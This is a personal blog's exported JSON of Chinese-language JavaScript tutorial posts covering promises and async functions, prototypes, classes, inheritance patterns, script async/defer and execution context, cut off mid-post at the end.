{"meta":{"title":"小柒","subtitle":"www.xiaoqi.cn","description":"欢迎来到我的世界!","author":"小柒","url":"https://coloey.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-11-12T10:10:34.000Z","updated":"2021-11-12T10:12:26.795Z","comments":true,"path":"categories/index.html","permalink":"https://coloey.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"异步函数策略","slug":"异步函数策略","date":"2022-04-16T03:35:37.000Z","updated":"2022-04-16T15:08:04.631Z","comments":true,"path":"2022/04/16/异步函数策略/","link":"","permalink":"https://coloey.github.io/2022/04/16/%E5%BC%82%E6%AD%A5%E5%87%BD%E6%95%B0%E7%AD%96%E7%95%A5/","excerpt":"","text":"实现sleep123456789async function sleep(delay)&#123; return new Promise((resolve)=&gt;setTimeout(resolve,delay)); &#125; async function foo()&#123; const t0=Date.now(); await sleep(1500);//暂停1500ms,await会期望等到一个实现thenable接口的对象，没有的话也会将其包装为promise console.log(Date.now()-t0); &#125; 实现平行加速promise没有按顺序执行，但是await按顺序接收到每个promise的值 1234567891011121314151617181920async function randomDelay(id)&#123; const delay=Math.random()*1000; return new Promise((resolve)=&gt;setTimeout(()=&gt;&#123; console.log(`$&#123;id&#125; finished`); resolve() &#125;,delay)) &#125; async function foo()&#123; const t0=Date.now() const p0=randomDelay(0); const p1=randomDelay(1); const p2=randomDelay(2); const p3=randomDelay(3); await p0; await p1; await p2; await p3; setTimeout(console.log,0,`$&#123;Date.now()-t0&#125; ms elapsed`) &#125; foo(); 12345678910111213141516async function randomDelay(id)&#123; const delay=Math.random()*1000; return new Promise((resolve)=&gt;setTimeout(()=&gt;&#123; console.log(`$&#123;id&#125; finished`); resolve(id) &#125;,delay)) &#125; async function foo()&#123; const t0=Date.now() const promises=Array(5).fill(null).map((key,index)=&gt;randomDelay(index)); for(const p of promises)&#123; console.log(`awaited $&#123;await p&#125;`) &#125; setTimeout(console.log,0,`$&#123;Date.now()-t0&#125; ms elapsed`) &#125; foo(); Promise.all原理只有传入的所有Promise都完成，返回promise才能完成，如果有任何promise被拒绝，返回的主promise就立即拒绝（抛弃任何其他promise的结果），如果全部完成，你会得到一个数组，其中包含传入的所有promise的完成值，对于拒绝的情况，你只会的到第一个拒绝promise的拒绝理由值，这种模式成为门，所有人到齐了才开门,传入空数组会立即完成 12345678910111213Promise.all=function(promises)&#123; const res=[]; return new Promise((resolve,reject)=&gt;&#123; promises.forEach(promise=&gt;&#123; promise.then((value,index)=&gt;&#123; res[idx]=value; if(res.length==promises.length)&#123; resolve(res) &#125; &#125;,reason=&gt;reject(reason)) &#125;) &#125;) &#125; 例： 12345678910111213141516171819 function runAsync (x) &#123; const p = new Promise(r =&gt; setTimeout(() =&gt; r(x, console.log(x)), 1000)) return p&#125;function runReject (x) &#123; const p = new Promise((res, rej) =&gt; setTimeout(() =&gt; rej(`Error: $&#123;x&#125;`, console.log(x)), 1000 * x)) return p&#125;Promise.all([runAsync(1), runReject(4), runAsync(3), runReject(2)]) .then(res =&gt; console.log(res)) .catch(err =&gt; console.log(err))// 1s后输出13// 2s后输出2Error: 2// 4s后输出4 Promise.race():只有第一个决议的promise取胜，并且决议结果成为返回promise的决议。其他任务虽然会继续进行，但是race已经不管那些任务的结果了，不能传入空数组，传入空数组promise.race()会挂住，且永远不会决议 1234567891011function runAsync (x) &#123; const p = new Promise(r =&gt; setTimeout(() =&gt; r(x, console.log(x)), 1000)) return p&#125;Promise.race([runAsync(1), runAsync(2), runAsync(3)]) .then(res =&gt; console.log(&#x27;result: &#x27;, res)) .catch(err =&gt; console.log(err))//1&#x27;result: &#x27; 123 每隔一秒打印1,2,3123const arr=[1,2,3]; arr.reduce( (p,x)=&gt;p.then(()=&gt;new Promise(resolve=&gt;setTimeout(()=&gt;resolve(console.log(x)),1000))),Promise.resolve()) 一秒后打印出1，2,3 123arr.reduce( (p,x)=&gt;p.then(new Promise(resolve=&gt;setTimeout(resolve(console.log(x)),1000))),Promise.resolve() ) 红绿灯交替闪烁123456789101112131415161718192021222324252627282930function red()&#123; console.log(&quot;red&quot;) &#125; function yellow()&#123; console.log(&quot;yellow&quot;) &#125; function green()&#123; console.log(&quot;green&quot;) &#125; const light=(time,cb)=&gt;&#123; return new Promise(resolve=&gt;&#123; setTimeout(()=&gt;&#123; cb(); resolve(); &#125;,time) &#125;) &#125; const step=function()&#123; Promise.resolve() .then(()=&gt;&#123; return light(3000,red) &#125;) .then(()=&gt;&#123; return light(2000,yellow) &#125;) .then(()=&gt;&#123; return light(1000,green) &#125;)&#125; step(); mergepromise 123456789101112131415161718192021222324252627282930313233343536const time = (timer) =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve() &#125;, timer) &#125;)&#125;const ajax1 = () =&gt; time(2000).then(() =&gt; &#123; console.log(1); return 1&#125;)const ajax2 = () =&gt; time(1000).then(() =&gt; &#123; console.log(2); return 2&#125;)const ajax3 = () =&gt; time(1000).then(() =&gt; &#123; console.log(3); return 3&#125;)function mergePromise (promises) &#123; // 在这里写代码 let data=[] let promise=Promise.resolve(); promises.forEach(ajax=&gt;&#123; //第一次then是调用ajax,第二次then是解析ajax的结果 promise=promise.then(ajax).then(res=&gt;&#123;data.push(res);return data&#125;)//把每次结果返回 &#125;) return promise; &#125;mergePromise([ajax1, ajax2, ajax3]).then(data =&gt; &#123; console.log(&quot;done&quot;); console.log(data); // data 为 [1, 2, 3]&#125;); 异步加载图片 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function loadImage(url)&#123; return new Promise((resolve,reject)=&gt;&#123; const img=new Image(); img.onload=function()&#123; console.log(&quot;一张图片加载完成&quot;) resolve(img) &#125; img.onerror=function()&#123; reject(new Error(&quot;Cannot load&quot;+url)); &#125; img.src=url; &#125;)&#125;var urls = [ &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting1.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting2.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting3.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting4.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting5.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn6.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn7.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn8.png&quot;,];function limitedLoad(urls,handler,limit)&#123; let sequence=[...urls]; let promises=sequence.splice(0,limit).map((url,index)=&gt;&#123; return handler(url).then(index=&gt;&#123; return index;//调用loadImage返回最先加载完成的那张照片下标 &#125;) &#125;) return sequence.reduce( (p,url)=&gt;&#123; return p.then(()=&gt;&#123;return Promise.race(promises)&#125;)//得到第一张加载完成的图片的下标 .then(fastIndex=&gt;&#123;promises[fastIndex]=handler(url).then(()=&gt;&#123;return fastIndex&#125;)&#125;)//将已经加载完成的照片的位置替换为为加载的照片 .catch(err=&gt;&#123;console.error(err)&#125;) &#125;,Promise.resolve())//初始为Promise.resolve() .then(()=&gt;&#123;return Promise.all(promises)&#125;)//最后3个用Promise.all加载&#125;limitedLoad(urls,loadImage,3).then(res=&gt;&#123; console.log(&quot;图片全部加载完成&quot;) console.log(res)&#125;).catch(err=&gt;&#123; console.error(err)&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"面向对象的原型模式和对象关联区别","slug":"面向对象的原型模式和对象关联区别","date":"2022-04-15T08:10:58.000Z","updated":"2022-04-15T08:57:12.807Z","comments":true,"path":"2022/04/15/面向对象的原型模式和对象关联区别/","link":"","permalink":"https://coloey.github.io/2022/04/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%85%B3%E8%81%94%E5%8C%BA%E5%88%AB/","excerpt":"","text":"面向对象的原型模式：1234567891011121314151617function Foo(who)&#123; this.me=who &#125; Foo.prototype.identify=function()&#123; return &quot;I am &quot;+this.me &#125; function Bar(who)&#123; Foo.call(this,who) &#125; Bar.prototype=Object.create(Foo.prototype); Bar.prototype.speak=function()&#123; alert(&quot;Hello&quot;+this.identify()+&quot;.&quot;) &#125; var b1=new Bar(&quot;b1&quot;); var b2=new Bar(&quot;b2&quot;); b1.speak(); b2.speak(); 对象关联的委托模式123456789101112131415Foo=&#123; init:function(who)&#123;this.me=who&#125;, identify:function()&#123;return &quot;I am &quot;+this.me&#125; &#125; Bar=Object.create(Foo); Bar.speak=function()&#123; alert(&quot;Hello&quot;+this.identify()+&quot;.&quot;) &#125; var b1=Object.create(Bar) b1.init(&quot;b1&quot;); var b2=Object.create(Bar) b2.init(&quot;b2&quot;); b1.speak(); b2.speak(); 类设计模式1234567891011121314151617181920212223class Foo&#123; constructor(who)&#123; var me=who &#125; identify()&#123; return &quot;I am &quot;+this.me &#125; &#125; class Bar extends Foo&#123; constructor(who)&#123; super();//这里super指的是父类的构造函数，相当于Foo.prototype.constructor.call(this);this指的是子类Bar this.me=who &#125; speak()&#123; alert(&quot;hello&quot;+super.identify())//这里super作为对象，指的是父类的原型对象，相当于Foo.prototype &#125; &#125; var b1=new Bar(&#x27;b1&#x27;); b1.speak(); var b2=new Bar(&#x27;b2&#x27;); b2.speak();","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"prototype,__proto__与costructor","slug":"prototype-proto-与costructor","date":"2022-04-15T05:21:41.000Z","updated":"2022-04-15T09:33:11.616Z","comments":true,"path":"2022/04/15/prototype-proto-与costructor/","link":"","permalink":"https://coloey.github.io/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/","excerpt":"","text":"本文转载自（ []: https://blog.csdn.net/cc18868876837/article/details/81211729） 文章目录 前言 _ _ proto _ _ 属性 prototype属性 constructor属性 总结提示：不要排斥，静下心来，认真读完，你就搞懂了！(可以先看一下最后的总结部分再回过头来完整看完) 前言 作为一名前端工程师，必须搞懂JS中的prototype、_proto__与constructor属性，相信很多初学者对这些属性存在许多困惑，容易把它们混淆，本文旨在帮助大家理清它们之间的关系并彻底搞懂它们。这里说明一点，__proto__属性的两边是各由两个下划线构成（这里为了方便大家看清，在两下划线之间加入了一个空格： proto _，读作“dunder proto”，“double underscore proto”的缩写），实际上，该属性在ES标准定义中的名字应该是[[Prototype]]，具体实现是由浏览器代理自己实现，谷歌浏览器的实现就是将[[Prototype]]命名为__proto__，大家清楚这个标准定义与具体实现的区别即可（名字有所差异，功能是一样的），可以通过该方式检测引擎是否支持这个属性：Object.getPrototypeOf({proto: null}) === null。本文基于谷歌浏览器（版本 72.0.3626.121）的实验结果所得。 现在正式开始！ 让我们从如下一个简单的例子展开讨论，并配以相关的图帮助理解： 1234function Foo() &#123;...&#125;;let f1 = new Foo(); 以上代码表示创建一个构造函数Foo()，并用new关键字实例化该构造函数得到一个实例化对象f1。这里稍微补充一下new操作符将函数作为构造器进行调用时的过程：函数被调用，然后新创建一个对象，并且成了函数的上下文（也就是此时函数内部的this是指向该新创建的对象，这意味着我们可以在构造器函数内部通过this参数初始化值），最后返回该新对象的引用，详细请看：详解JavaScript中的new操作符。虽然是简简单单的两行代码，然而它们背后的关系却是错综复杂的，如下图所示： 看到这图别怕，让我们一步步剖析，彻底搞懂它们！ 图的说明：右下角为图例，红色箭头表示__proto__属性指向、绿色箭头表示prototype属性的指向、棕色实线箭头表示本身具有的constructor属性的指向，棕色虚线箭头表示继承而来的constructor属性的指向；蓝色方块表示对象，浅绿色方块表示函数（这里为了更好看清，Foo()仅代表是函数，并不是指执行函数Foo后得到的结果，图中的其他函数同理）。图的中间部分即为它们之间的联系，图的最左边即为例子代码。 __ proto __ 属性 首先，我们需要牢记两点： ①____proto____和constructor属性是对象所独有的；② prototype属性是函数所独有的。但是由于JS中函数也是一种对象，所以函数也拥有__proto__和constructor属性，这点是致使我们产生困惑的很大原因之一。上图有点复杂，我们把它按照属性分别拆开，然后进行分析： 第一，这里我们仅留下 proto 属性，它是对象所独有的，可以看到__proto__属性都是由一个对象指向一个对象，即指向它们的原型对象（也可以理解为父对象），那么这个属性的作用是什么呢？它的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（可以理解为父对象）里找，如果父对象也不存在这个属性，则继续往父对象的__proto__属性所指向的那个对象（可以理解为爷爷对象）里找，如果还没找到，则继续往上找…直到原型链顶端null（可以理解为原始人。。。），再往上找就相当于在null上取值，会报错（可以理解为，再往上就已经不是“人”的范畴了，找不到了，到此结束，null为原型链的终点），由以上这种通过__proto__属性来连接对象直到null的一条链即为我们所谓的原型链。 其实我们平时调用的字符串方法、数组方法、对象方法、函数方法等都是靠__proto__继承而来的。 prototype属性 第二，接下来我们看 prototype 属性： prototype属性，别忘了一点，就是我们前面提到要牢记的两点中的第二点，它是函数所独有的，（除了Object基本类型），它是从一个函数指向一个对象。它的含义是函数的原型对象，也就是这个函数（其实所有函数都可以作为构造函数)所创建的实例的原型对象，由此可知：f1.proto === Foo.prototype，它们两个完全一样。那prototype属性的作用又是什么呢？它的作用就是包含可以由特定类型的所有实例共享的属性和方法，也就是让该函数所实例化的对象们都可以找到公用的属性和方法。任何函数在创建的时候，其实会默认同时创建该函数的prototype对象。 4. constructor属性 最后，我们来看一下 constructor 属性： constructor属性也是对象才拥有的，它是从一个对象指向一个函数，含义就是指向该对象的构造函数，每个对象都有构造函数（本身拥有或继承而来，继承而来的要结合__proto__属性查看会更清楚点，如下图所示），从上图中可以看出Function这个对象比较特殊，它的构造函数就是它自己（因为Function可以看成是一个函数，也可以是一个对象)，所有函数和对象最终都是由Function构造函数得来，所以constructor属性的终点就是Function这个函数。 感谢网友的指出，这里解释一下上段中“每个对象都有构造函数”这句话。这里的意思是每个对象都可以找到其对应的constructor，因为创建对象的前提是需要有constructor，而这个constructor可能是对象自己本身显式定义的或者通过proto在原型链中找到的。而单从constructor这个属性来讲，只有prototype对象才有。每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象，而函数创建的对象.proto === 该函数.prototype，该函数.prototype.constructor===该函数本身，故通过函数创建的对象即使自己没有constructor属性，它也能通过__proto__找到对应的constructor，所以任何对象最终都可以找到其构造函数（null如果当成对象的话，将null除外）。如下： 总结 总结一下： 我们需要牢记两点： ①__proto__和constructor属性是对象所独有的； ② prototype属性是函数所独有的，因为函数也是一种对象，所以函数也拥有__proto__和constructor属性。__proto__属性的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（父对象）里找，一直找，直到__proto__属性的终点null，再往上找就相当于在null上取值，会报错。通过__proto__属性将对象连接起来的这条链路即我们所谓的原型链。prototype属性的作用就是让该函数所实例化的对象们都可以找到公用的属性和方法，即f1.proto === Foo.prototype。constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function。 本文就此结束了，希望对那些对JS中的prototype、__proto__与constructor属性有困惑的同学有所帮助。 最后，感谢这两篇博文，本文中的部分内容参考自这两篇博文： 一张图理解prototype、proto和constructor的三角关系prototype和__proto__的关系是什么？小彩蛋：实现继承（相对完美、优雅） 123456789101112131415161718192021222324function inherit(Child, Parent) &#123; // 继承原型上的属性 Child.prototype = Object.create(Parent.prototype) // 修复 constructor Child.prototype.constructor = Child // 存储超类 Child.super = Parent // 静态属性继承 if (Object.setPrototypeOf) &#123; // setPrototypeOf es6 Object.setPrototypeOf(Child, Parent) &#125; else if (Child.__proto__) &#123; // __proto__ es6 引入，但是部分浏览器早已支持 Child.__proto__ = Parent &#125; else &#123; // 兼容 IE10 等陈旧浏览器 // 将 Parent 上的静态属性和方法拷贝一份到 Child 上，不会覆盖 Child 上的方法 for (var k in Parent) &#123; if (Parent.hasOwnProperty(k) &amp;&amp; !(k in Child)) &#123; Child[k] = Parent[k] &#125; &#125; &#125;&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"类","slug":"类","date":"2022-04-15T02:03:02.000Z","updated":"2022-04-15T14:21:17.594Z","comments":true,"path":"2022/04/15/类/","link":"","permalink":"https://coloey.github.io/2022/04/15/%E7%B1%BB/","excerpt":"","text":"类构造函数方法名constructor会告诉解释器在使用new操作符创建类的新实例时，应该调用这个函数，构造函数的定义不是必须的，不定义构造函数相当于将构造函数定义为空函数 使用new调用类的构造函数会执行如下操作： 在内存中创建一个新对象 这个新对象内部的[[Prototype]]即__proto__指针被赋值为构造函数的prototype属性 构造函数内部的this被赋值为这个新对象（即this指向新对象） 执行构造函数内部的代码（给新对象添加属性） 如果构造函数返回非空对象，则返回该对象；否则，返回刚创建的新对象 12345class Person&#123; &#125; let p1=new Person(); console.log(p1.__proto__===Person.prototype);//true 默认情况下，类构造函数会在执行后返回this对象，构造函数返回的对象会被用作实例化的对象，如果没用引用新创建的this对象，那么这个对象会被销毁。不过，如果，返回的不是this对象，而是其他对象，那么这个对象不会通过instanceof操作符检测出跟类有关联。 123456789101112131415class Person&#123; constructor(override)&#123; this.foo=&quot;foo&quot;; if(override)&#123; return &#123; bar:&quot;bar&quot; &#125; &#125; &#125; &#125; let p1=new Person(),p2=new Person(true); console.log(p1) console.log(p1 instanceof Person); console.log(p2);//没有引用构造函数创建的this对象，对象被销毁而返回的其他对象与类没有关系 console.log(p2 instanceof Person) 类构造函数与普通构造函数区别调用类构造函数必须使用new操作符，而普通构造函数如果不使用new调用，那么就会以全局的this作为内部对象，调用类构造函数没有使用new则会抛出错误 1let p3=Person();//TypeError 类构造函数在实例化后，可以在实例上引用它 1234class Person&#123;&#125;let p1=new Person();//使用对类构造函数的引用创建一个新实例let p2=new p1.constructor(); 把类当成特殊的函数123class Person&#123;&#125;console.log(Person);//class Person&#123;&#125;console.log(typeof Person)//function 类标识符有prototype属性，而这个原型也有一个constructor属性指向类自身 1234class Person&#123; &#125; console.log(Person===Person.prototype.constructor);//true 使用instanceof检查一个对象和类构造函数，以确定对象是不是类的实例。 12let p=new Person();console.log(p instanceof Person)//true 类本身具有和普通构造函数一样的行为，在类的上下文中，类本身使用new调用时就被当做构造函数，类中的constructor方法不会被当做构造函数， 123456789101112class Person&#123; &#125; let p1=new Person(); console.log(p1 instanceof Person);//true console.log(p1.constructor=== Person);//true console.log(p1 instanceof Person.constructor)//false let p2=new Person.constructor(); console.log(p2 instanceof Person)//false console.log(p2 .constructor=== Person);//false console.log(p2 instanceof Person.constructor)//true 实例，原型和类成员实例成员每次通过new调用类标识符时都会执行类构造函数，可以为新创建的实例this添加自有属性。每个实例都对应一个唯一的成员对象，所有成员都不会在原型上共享 123456789101112class Person&#123; constructor()&#123; this.name=new String(&#x27;Jack&#x27;); this.sayName=()=&gt;console.log(this.name); &#125; sayAge(age)&#123; console.log(age) &#125; &#125; let p1=new Person(),p2=new Person(); console.log(p1.name===p2.name)//false console.log(p1.sayAge(18)===p2.sayAge(19))//true 原型方法为了在实例间共享方法，类定义语法在类块中定义的方法作为原型方法 12 //在类块中定义的所有内容都会定义在类的原型上console.log(p1.sayAge===Person.prototype.sayAge);//true 可以把方法定义在类构造函数或者类块中，但不能在类块给原型添加原始值或对象作为成员数据,但是可以在类块外部手动添加成员数据 1Person.greeting=&quot;My name is&quot; 类方法等同于对象属性因此可以使用字符串，符号或计算的值作为键, 也支持获取和设置访问器 12345678910111213141516171819202122232425const symbolKey=Symbol(&#x27;symbolkey&#x27;);class Person()&#123; stringKey()&#123; console.log(&#x27;invoked stringKey&#x27;) &#125; [symbolKey]()&#123; console.log(&#x27;invoked symbolKey&#x27;) &#125; [&#x27;computed&#x27;+&#x27;Key&#x27;]()&#123; console.log(&#x27;invoked computedKey&#x27;) &#125; set name(newvalue)&#123; this.name_=newName; &#125; get name()&#123; return this.name_ &#125;&#125;let p=new Person()p.stringKey();p[symbolKey]();p.computedKey();p.name=&#x27;jake&#x27;;console.log(p.name);//Jake 静态类方法这些方法通常用于执行不特定于实例的操作，也不要求存在类的实例 与原型成员类似，静态成员每个类上只能有一个 静态类成员在类定义中使用static关键字作为前缀，在静态成员中，this引用类自身，其他所有约定跟原型成员一样，静态类方法适合作为实例工厂 12345678910111213class Person&#123; constructor()&#123; this.name=new String(&#x27;Jack&#x27;); this.sayName=()=&gt;console.log(this.name); &#125; sayAge(age)&#123; console.log(age) &#125; static create()&#123; return new Person(Math.floor(Math.random()*100)) &#125; &#125; console.log(Person.create())//Person &#123;name: String, sayName: ƒ&#125;name: String &#123;&#x27;Jack&#x27;&#125;sayName: ()=&gt;console.log(this.name)[[Prototype]]: Object 关于继承[]: https://www.bookstack.cn/read/es6-3rd/spilt.1.docs-class-extends.md 关于super[]: https://www.bookstack.cn/read/es6-3rd/spilt.3.docs-class-extends.md 抽象基类通过new.target保存通过new关键字调用的类或函数，在普通函数中调用new.target返回undefined,通过在实例化时检测new.target是不是抽象基类，可以阻止对抽象基类的实例化 1234567891011class Vehicle&#123; constructor()&#123; console.log(new.target); if(new.target===Vehicle)&#123; throw new Error(&#x27;Vehicle cannot be directly instantiated&#x27;) &#125; &#125; &#125; class Bus extends Vehicle&#123;&#125; new Bus(); new Vehicle()//testIframe.html:193 Uncaught Error: Vehicle cannot be directly instantiated 继承内置类型1234567891011class SuperArray extends Array&#123; shuffle()&#123; for(let i=this.length-1;i&gt;=0;i--)&#123; let j=Math.floor(Math.random(0,i+1));//0-i+1向下取整 [this[i],this[j]]=[this[j],this[i]] &#125; &#125; &#125; let a=new SuperArray(1,2,3,4,5); a.shuffle() console.log(a);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"async 和defer","slug":"async-和defer","date":"2022-04-15T00:51:47.000Z","updated":"2022-04-15T01:02:46.471Z","comments":true,"path":"2022/04/15/async-和defer/","link":"","permalink":"https://coloey.github.io/2022/04/15/async-%E5%92%8Cdefer/","excerpt":"","text":"script元素包含async属性和defer属性： async:可选，表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载，只对外部脚本文件有效，标记过async的脚本并不保证能按照它们出现的次序执行 defer:可选，表示脚本可以延迟到文档完全被解析和渲染后再执行，相当于告诉浏览器立即下载，延迟执行，且按照顺序执行 只对外部脚本有效，在IE7及更早版本中，对行内脚本也可以指定这个属性 如果把script标签放在head标签里，意味着必须把所有JavaScript代码都下载，加息和解释完成后，才能渲染压面页面在浏览器解析到body的其实标签时开始渲染。因此现代Web通常把js引用放在body元素中页面内容后面这样页面就会在处理js代码之前完全渲染页面","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"组合继承和原型继承","slug":"继承方式","date":"2022-04-14T10:11:28.000Z","updated":"2022-04-15T05:39:50.804Z","comments":true,"path":"2022/04/14/继承方式/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/","excerpt":"","text":"组合继承综合了原型链和盗用构造函数，将两者优点结合，使用原型链继承原型上的属性和方法，通过盗用构造函数继承实例属性，这样既可以把方法定义在原型上实现重用，又可以让每个实例都有自己的属性 1234567891011121314151617181920212223242526function SuperType(name)&#123; this.name=name; this.colors=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;]; &#125; SuperType.prototype.sayName=function()&#123; console.log(this.name);//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文 &#125; function SubType(name,age) &#123; SuperType.call(this,name);//SuperType的构造函数绑定SubType的构造函数,自定义实例属性，第二次调用SuperType this.age=age;&#125;//继承原型上的方法，让SubType的原型指向SuperType的实例,第一次调用SuperTypeSubType.prototype=new SuperType();SubType.prototype.sayAge=function()&#123; console.log(this.age);&#125;let instance1=new SubType(&#x27;Ann&#x27;,29);instance1.colors.push(&quot;balck&quot;);console.log(instance1.colors);instance1.sayName();instance1.sayAge();let instance2=new SubType(&quot;Greg&quot;,27);console.log(instance2.colors);instance2.sayName();instance2.sayAge(); 原型式继承12345678910111213//object.create()function object(o)&#123; function F()&#123;&#125;;//创建一个构造函数 F.prototype=o;//构造函数的原型指向参数对象o return new F();//返回F对象实例&#125;let person=&#123; name:&quot;Ann&quot;, friends:[&quot;Mary&quot;,&quot;Harry&quot;,&quot;Van&quot;]&#125;let anotherPerson=object(person);anotherPerson.friends.push(&quot;Mike&quot;);console.log(person.friends);// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;] object()函数创建一个临时构造函数，将传入对象赋值给这个构造函数原型，然后返回这个临时类型的一个实例。本质上，object()是队传入的对象执行了一次浅复制 这里的object函数相当与object.create() 12345678let person=&#123; name:&quot;Ann&quot;, friends:[&quot;Mary&quot;,&quot;Harry&quot;,&quot;Van&quot;]&#125;let anotherPerson=object。create(person);anotherPerson.friends.push(&quot;Mike&quot;);console.log(person.friends);// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;] 原型式继承适合不需要单独创建构造函数，但仍然需要在对象间共享信息的场合。 寄生式继承与原型式继承比较接近的一种继承方式是寄生式继承 12345678910111213function createAnother(original)&#123; let clone=object(original);//通过调用函数创建一个新对象 clone.sayHi=function()&#123;//以某种方式增强这个对象 console.log(&quot;hi&quot;); &#125; return clone;//返回这个对象&#125;let person=&#123; name:&quot;Ann&quot;, friends:[&quot;Mary&quot;,&quot;Harry&quot;,&quot;Van&quot;]&#125;let anotherPerson=createAnother(person);anotherPerson.sayHi(); 寄生式继承同样适合主要关注对象，而不在乎类型和构造函数的场景。痛过寄生式继承给对象添加函数会导致函数难以重用，与构造函数模式类似。 寄生式组合继承1234567891011121314151617181920212223242526function inheritPrototype(subType,superType)&#123;//参数分别是子类和父类的构造函数 let prototype=Object.create(superType.prototype);//先复制父类的原型对象 prototype.constructor=subType;//增强对象，让新的原型对象的构造函数指向子类构造函数 subType.prototype=prototype;//赋值对象，让子类原型指向新的原型&#125;function SuperType(name)&#123; this.name=name; this.colors=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125; SuperType.prototype.sayName=function()&#123; console.log(this.name);//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文 &#125; function SubType(name,age) &#123; SuperType.call(this,name);//SuperType的构造函数绑定SubType的构造函数,调用Supertype() this.age=age; &#125;inheritPrototype(SubType,SuperType);SubType.prototype.sayAge=function()&#123; console.log(this.age); &#125; let instance1=new SubType(&#x27;Ann&#x27;,29); instance1.colors.push(&quot;balck&quot;); console.log(instance1.colors); instance1.sayName(); instance1.sayAge(); 寄生式组合继承基本模式： 先创建父类原型的一个副本prototype 给prototype设置constructor属性为subType,增强对象，解决由于重写原型导致默认constructor丢失问题 将新创建的对象赋值给子类型的原型 只调用一次SuperType构造函数，效率最高","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"执行上下文和作用域","slug":"执行上下文和作用域","date":"2022-04-14T08:21:59.000Z","updated":"2022-04-14T08:45:20.666Z","comments":true,"path":"2022/04/14/执行上下文和作用域/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/","excerpt":"","text":"执行上下文有全局上下文和函数上下文，块级上下文： 上下文中的代码在执行时，会创建变量对象的一个作用域链，这个作用域链决定了各级上下文中的代码在访问变量和函数时的顺序，代码正在执行的上下文的变量对象始终位于作用域链的最前端，如果上下文时函数，则其活动对象用作变量对象，作用域链中的下一个变量对象来自包含上下文…以此类推至全局上下文，全局上下文变量对象始终是作用域链的最后一个变量对象（window) 作用域链增强执行上下文主要有全局上下文和函数上下文两种（eval()调用内部存在第三种上下文），但有其他方式增强作用域链， try/catch语句中的catch块 with语句 这两种情况会在作用域链的前端添加一个变量对象，对with语句来说，会向作用域链前端添加指定对象，对catch语句，会创建一个新的变量对象，这个变量对象会包含要抛出的错误对象的声明 1234567function buildUrl()&#123; let qs=&quot;?debug=true&quot;; with(location)&#123; let url=href+qs; &#125; return url;&#125; with语句将location对象作为上下文，因此location会被添加到作用域链的前端","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原始值与引用值及确定类型","slug":"原始值与引用值及确定类型","date":"2022-04-14T07:04:04.000Z","updated":"2022-04-14T08:21:25.400Z","comments":true,"path":"2022/04/14/原始值与引用值及确定类型/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"原始值和引用值ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。 引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。 区别动态属性引用值可以随时添加，修改删除属性。 